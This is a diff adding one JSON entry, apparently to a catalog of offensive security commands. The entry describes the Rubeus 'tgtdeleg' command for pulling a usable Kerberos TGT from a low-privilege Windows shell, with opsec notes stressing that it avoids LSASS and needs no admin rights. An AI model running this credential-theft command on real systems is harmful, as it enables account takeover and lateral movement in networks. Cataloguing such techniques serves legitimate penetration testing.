@@ -1,0 +1,13 @@
+{
+  "id": "rubeus-tgtdeleg",
+  "name": "Rubeus tgtdeleg",
+  "command": "Rubeus.exe tgtdeleg /nowrap",
+  "description": "Extract a usable TGT for the current user without elevation by abusing the GSS-API delegation flow. The cleanest way to grab a TGT from a low-priv shell — no LSASS touching, no admin needed.",
+  "platform": "windows",
+  "requires": ["shell"],
+  "protocols": ["kerberos"],
+  "tags": ["rubeus", "tgt", "delegation", "opsec"],
+  "examples": [
+    "Rubeus.exe tgtdeleg /nowrap"
+  ]
+}
